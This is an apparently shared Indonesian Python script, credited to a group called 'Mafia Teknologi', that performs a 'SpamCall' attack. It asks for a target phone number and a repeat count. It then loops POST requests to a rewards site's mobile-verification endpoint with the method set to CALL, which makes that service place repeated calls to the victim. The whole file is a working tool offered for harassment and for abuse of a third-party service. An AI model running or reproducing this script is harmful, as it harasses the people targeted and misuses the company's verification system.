# by panglima jateng
# record ? silahkan bro
# mafia teknologi
# https://youtube.com/channel/UCSJohuQCtqfD2P73Z65g8jg
# module
import os,sys,time,requests
from time import sleep
# formulir
print("    ")
nama = input("Siapa Nama Kaka: ")
os.system("clear")
print("\033[32;1mHay",nama)
sleep(1)
os.system("figlet SpamCall")
banner= """
\033[36;1m============================================
\033[37;1m{•} Author : Panglima Jateng
\033[37;1m{•} Team   : Mafia Teknologi
\033[36;1m============================================\033[37;1m"""
sleep(1)
print(banner)
# pemasukan
nomor = input("Nomor Target: ")
jumlah = int(input("Jumlah Spam: "))
# data call
url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
dat = {"method": "CALL","countryCode": "id",}
# hasil selesai
for i in range(jumlah):
    send = requests.post(url+nomor, headers=ua, data=dat)
    print("\033[33;1m [•] Status ~+> ",(send.json()["message"]))
